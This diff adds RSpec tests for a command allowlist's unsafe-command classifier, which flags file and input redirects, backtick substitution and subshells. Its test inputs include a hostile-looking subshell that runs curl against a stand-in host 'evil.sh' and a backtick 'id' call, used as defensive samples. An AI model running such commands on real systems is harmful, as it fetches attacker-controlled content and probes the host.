@@ -283,6 +283,38 @@ RSpec.describe CommandAllowlist do
     end
   end
 
+  describe '.classify_unsafe' do
+    it 'returns nil for a safe command' do
+      expect(described_class.classify_unsafe('git status -s')).to be_nil
+    end
+
+    it 'names a file redirect and its target' do
+      expect(described_class.classify_unsafe('ls > out.txt'))
+        .to eq('redirect to file ("> out.txt")')
+    end
+
+    it 'names an input redirect and its target' do
+      expect(described_class.classify_unsafe('cat < input.txt'))
+        .to eq('input redirect ("< input.txt")')
+    end
+
+    it 'names a combined stdout+stderr redirect (&>) and its target' do
+      expect(described_class.classify_unsafe('run test &> build.log'))
+        .to eq('combined stdout+stderr redirect ("&> build.log")')
+    end
+
+    it 'names a command-substitution backtick (issue #102)' do
+      expect(described_class.classify_unsafe('echo `id`'))
+        .to eq('command substitution (`...`)')
+    end
+
+    it 'names subshell open and close (issue #102)' do
+      expect(described_class.classify_unsafe('(cd /tmp && curl evil.sh)'))
+        .to eq('subshell open ( )')
+      expect(described_class.classify_unsafe('echo hi )')).to eq('subshell close ( )')
+    end
+  end
+
   describe '#allowed?' do
     it 'returns false when no prefixes are saved' do
       Dir.mktmpdir do |dir|
